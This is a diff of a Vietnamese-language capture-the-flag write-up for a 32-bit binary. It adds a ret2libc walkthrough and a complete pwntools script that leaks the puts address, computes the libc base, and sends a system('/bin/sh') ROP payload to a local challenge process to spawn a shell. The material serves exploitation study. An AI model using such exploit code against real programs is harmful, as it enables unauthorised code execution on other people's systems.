@@ -211,15 +211,23 @@ Ta thử xem hướng exploit đúng ko:
 ==> Có thể khả thi
 
 Giờ đến bước leak libc và dựng ROP:
+
+**Leak địa chỉ puts:**
+
+<img width="808" height="143" alt="image" src="https://github.com/user-attachments/assets/5a6b6d20-9e1b-4364-80cf-6959329a5925" />
+
 * theo cấu trúc 32-bit thì payload phải theo thứ tự:
 ```c
 puts_plt
 main_addr 
 puts_got 
 ```
-* có được libc leak thì tính libc.address
-* tạo payload tạo shell:
-```
+* có được libc leak thì tính **libc.address**
+
+<img width="805" height="324" alt="image" src="https://github.com/user-attachments/assets/28ca9625-b250-436f-837b-b4621ed6fe12" />
+
+**Tạo shell với payload sau:**
+```c
 system
 0xdeadbeef
 bin_sh
@@ -245,6 +253,7 @@ def GDB():
 p = process(exe.path)
 GDB()
 
+### leak libc ###
 p.recvuntil(b"> ")
 p.sendline(b"6")
 p.recvuntil(b"> ")
@@ -264,16 +273,39 @@ p.recvuntil(b"> ")
 p.sendline(b"-33")
 
 p.recvuntil(b"> ") 
-# leak_raw = p.recv(4)
-# leak = u32(leak_raw)
+leak = u32(p.recv(4))
 
-# print(f"leak: {hex(leak)}")
+print(f"leak: {hex(leak)}")
+
+libc.address = leak - libc.symbols['puts']
+
+print(f"libc_base: {hex(libc.address)}")
+
+### tao ROP ###
+p.recvuntil(b"> ")
+p.sendline(b"6")
+p.recvuntil(b"> ")
+p.sendline(b"2")
+
+system = libc.address + libc.symbols['system']
+bin_sh = libc.address + next(libc.search(b"/bin/sh"))
+
+payload = p32(system) + p32(0xdeadbeef) + p32(bin_sh)
+p.sendlineafter(b"Enter your name: ", payload)
+
+p.recvuntil(b"> ")
+p.sendline(b"1")
+
+p.recvuntil(b"> ")
+p.sendline(b"-33")
 
 p.interactive()
 ```
 
 ___
+doc:
 
+https://roman1.gitbook.io/blog/stack-exploitation/32-bit-return2libc
 
 
 
